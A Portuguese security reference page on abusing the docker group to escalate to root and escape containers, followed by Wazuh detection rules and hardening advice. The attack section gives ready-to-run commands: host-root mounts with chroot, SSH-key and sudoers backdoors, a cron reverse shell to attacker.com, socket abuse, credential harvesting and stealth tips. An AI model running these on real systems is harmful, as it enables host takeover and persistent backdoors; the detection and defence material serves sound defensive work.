# docker

**Plataforma:** Linux / macOS

**Categorias:** Escalada de privilégios, Fuga de container, Leitura e escrita de arquivos do host, Shell root

**MITRE ATT&CK:** T1611 (Escape to Host), T1548.001 (SUID/SGID), T1005 (Data from Local System)

**Referência ofensiva:** https://gtfobins.org/gtfobins/docker/

---

## O que é o docker

O Docker é a principal plataforma de containerização em uso. O daemon do Docker (`dockerd`) é executado com privilégios de root, e qualquer usuário membro do grupo `docker` pode interagir com esse daemon — o que na prática equivale a acesso root ao sistema host.

Essa é uma característica de design do Docker, não um bug: o grupo `docker` existe justamente para permitir que usuários não-root usem o Docker sem `sudo`. O problema é que muitos administradores não percebem que adicionar um usuário ao grupo `docker` é equivalente a dar sudo irrestrito a esse usuário.

---

## Por que atacantes usam o docker

O docker é um dos vetores de escalada de privilégios mais fáceis e mais frequentemente mal configurados em ambientes Linux. Se um usuário comprometido é membro do grupo `docker`, a escalada para root no host é trivial e imediata. Além disso, em ambientes de CI/CD onde o agente de build roda com acesso ao socket do Docker, comprometer o pipeline equivale a comprometer o host inteiro.

---

## Técnicas de abuso

### Escalada de privilégios via montagem do filesystem do host

A técnica fundamental: montar o filesystem raiz do host dentro de um container e operar sobre ele com privilégios de root.

```bash
# Montar o filesystem raiz do host no container e obter shell root
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Equivalente com bash
docker run -v /:/host --rm -it ubuntu bash -c "chroot /host bash"

# Versão mais discreta (usa imagem já presente no sistema)
docker run -v /:/mnt --rm -it $(docker images -q | head -1) chroot /mnt sh
```

Uma vez dentro do chroot do host como root, o atacante tem acesso irrestrito ao sistema — pode ler `/etc/shadow`, adicionar usuários, criar chaves SSH, modificar sudoers e instalar backdoors.

### Adicionar usuário root ou backdoor SSH sem sair do container

```bash
# Adicionar chave SSH ao root do host a partir do container
docker run -v /root:/mnt --rm alpine sh -c \
  "mkdir -p /mnt/.ssh && echo 'ssh-rsa AAAA... attacker' >> /mnt/.ssh/authorized_keys"

# Adicionar entrada no cron do host
docker run -v /etc:/mnt --rm alpine sh -c \
  "echo '* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /mnt/cron.d/backdoor"

# Modificar /etc/sudoers do host para dar sudo sem senha ao usuário atual
docker run -v /etc:/mnt --rm alpine sh -c \
  "echo '$USER ALL=(ALL) NOPASSWD:ALL' >> /mnt/sudoers"

# Copiar /bin/bash com SUID para local acessível
docker run -v /tmp:/mnt --rm alpine sh -c \
  "cp /bin/sh /mnt/.sh && chmod +s /mnt/.sh"
```

### Executar container com --privileged (fuga de container)

Em ambientes onde já se está dentro de um container, a flag `--privileged` dá acesso a todos os devices do host e permite montar o disco diretamente:

```bash
# Se já está num container com acesso ao socket Docker
docker run --privileged --rm -it alpine sh

# Dentro do container privilegiado: montar o disco do host
fdisk -l                          # identificar o disco do host (ex: /dev/sda1)
mount /dev/sda1 /mnt              # montar o disco
chroot /mnt                       # acessar o sistema do host
```

### Acesso via socket Docker exposto

Se o socket `/var/run/docker.sock` está acessível (erro comum em containers de CI/CD):

```bash
# Verificar acesso ao socket
ls -la /var/run/docker.sock

# Usar curl via socket Unix para criar container malicioso
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /mnt sh"],"Binds":["/:/mnt"]}'
```

### Reconhecimento via docker

```bash
# Listar containers em execução (podem conter serviços internos)
docker ps

# Listar imagens disponíveis (útil para escolher imagem do sistema para escalada)
docker images

# Inspecionar variáveis de ambiente de containers (frequentemente contêm credenciais)
docker inspect $(docker ps -q) | grep -i "env\|password\|secret\|key\|token"

# Acessar logs de containers
docker logs <container_id>
```

---

## Técnicas de bypass e evasão

### Usar imagem já presente para evitar pull

```bash
# Pull de imagem ausente gera tráfego de rede detectável
# Usar imagem já presente no host é mais discreto
docker images --format "{{.Repository}}:{{.Tag}}" | head -5
docker run -v /:/mnt --rm -it <imagem_existente> chroot /mnt sh
```

### Nomear container como serviço legítimo

```bash
docker run --name "prometheus-exporter" -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- docker com `-v /:/` ou `-v /:/mnt` — montagem do filesystem raiz do host
- docker com `--privileged` — container com acesso total ao host
- docker com `chroot` como argumento de comando — fuga de container via chroot
- Acesso ao socket `/var/run/docker.sock` por processo não esperado
- docker executado por usuário não-administrador

**Indicadores de média relevância:**

- docker com volumes que incluem `/etc`, `/root`, `/home`, `/var`
- Novos containers criados fora de horário de expediente
- docker inspect em containers em execução (reconhecimento de credenciais)

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/linux/0102-gtfobins_privesc.xml -->

<group name="lolbins,gtfobins,linux,privesc">

  <!-- docker com montagem do filesystem raiz do host -->
  <rule id="100240" level="15">
    <if_group>auditd</if_group>
    <field name="audit.command">docker</field>
    <field name="audit.execve" type="pcre2">-v\s+/:/|--volume\s+/:/</field>
    <description>docker montando filesystem raiz do host — escalada de privilegios imediata para root</description>
    <mitre>
      <id>T1611</id>
      <id>T1548.001</id>
    </mitre>
  </rule>

  <!-- docker com --privileged -->
  <rule id="100241" level="14">
    <if_group>auditd</if_group>
    <field name="audit.command">docker</field>
    <field name="audit.execve" type="pcre2">--privileged</field>
    <description>docker com --privileged — container com acesso irrestrito ao host</description>
    <mitre>
      <id>T1611</id>
    </mitre>
  </rule>

  <!-- docker com volume cobrindo diretórios sensíveis do host -->
  <rule id="100242" level="13">
    <if_group>auditd</if_group>
    <field name="audit.command">docker</field>
    <field name="audit.execve" type="pcre2">-v\s+/(etc|root|home|var/shadow|proc):</field>
    <description>docker montando diretorio sensivel do host — possivel acesso a credenciais ou configuracoes</description>
    <mitre>
      <id>T1005</id>
    </mitre>
  </rule>

</group>
```

### Falsos positivos comuns e como reduzir o ruído

**Containers de desenvolvimento legítimos** — desenvolvedores frequentemente montam volumes do host para desenvolvimento (código-fonte, configurações). A montagem de `/` ou de `/etc` é extremamente incomum em uso legítimo. Filtre por diretórios de projeto (ex: `/home/user/projeto:/app`) versus diretórios de sistema.

**Ferramentas de CI/CD** — pipelines de build às vezes montam volumes para acesso a configurações. Documente os volumes esperados e alerte para qualquer variação.

---

## Proteção e controles defensivos

**Não adicionar usuários ao grupo docker sem necessidade explícita:** a instrução correta é usar `sudo docker` com entradas específicas no sudoers, ou usar rootless Docker, que não expõe o daemon root.

**Rootless Docker:** execute o daemon Docker sem privilégios root. O rootless Docker mapeia UIDs e limita o impacto de uma fuga de container:

```bash
dockerd-rootless-setuptool.sh install
```

**Restringir o socket do Docker:** o arquivo `/var/run/docker.sock` deve ser acessível apenas por root e pelo grupo docker. Em ambientes de CI/CD, evite montar esse socket em containers de build — use alternativas como Kaniko ou Buildah para builds sem acesso ao daemon Docker.

**Políticas AppArmor/SELinux para containers:** use perfis de confinamento para limitar o que processos dentro de containers podem fazer no host, mesmo com `--privileged`.

---

## Referências

- GTFOBins — docker: https://gtfobins.org/gtfobins/docker/
- MITRE ATT&CK T1611: https://attack.mitre.org/techniques/T1611/
- Docker Security: https://docs.docker.com/engine/security/
